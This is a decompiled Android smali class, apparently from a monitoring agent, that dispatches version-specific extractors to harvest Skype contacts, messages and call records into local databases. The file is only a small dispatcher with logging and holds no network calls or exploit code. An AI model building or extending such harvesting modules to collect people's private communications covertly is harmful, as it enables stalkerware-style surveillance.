.class public Lcom/hp/vd/module/custom/skype/SkypeExtractor;
.super Ljava/lang/Object;
.source "SkypeExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "SkypeExtractor"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected extractorv7:Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;

.field protected extractorv8:Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeContactData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeMessageData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeCallData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 17
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->context:Lcom/hp/vd/context/Context;

    .line 18
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->extractorv7:Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->extractorv8:Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;

    .line 32
    iput-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->context:Lcom/hp/vd/context/Context;

    .line 33
    iput-object p5, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 34
    iput-object p6, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 44
    new-instance v0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;

    move-object v1, v0

    move-object v2, p1

    move-object v3, p2

    move-object v4, p3

    move-object v5, p4

    move-object v6, p5

    move-object v7, p6

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->extractorv7:Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;

    .line 56
    new-instance p2, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;

    move-object v1, p2

    move-object v3, p3

    move-object v4, p4

    move-object v5, p5

    move-object v6, p6

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object p2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->extractorv8:Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 69
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->extractorv8:Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;

    invoke-virtual {v0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->isCompatible()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 70
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SkypeExtractor"

    const-string v2, "run(): about to run v8 extractor."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 72
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->extractorv8:Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;

    invoke-virtual {v0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->run()V

    goto :goto_0

    .line 74
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SkypeExtractor"

    const-string v2, "run(): about to run v7 extractor."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 76
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->extractorv7:Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;

    invoke-virtual {v0}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->run()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 80
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractor"

    const-string v3, "Exception caught in the main extractor\'s run()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method
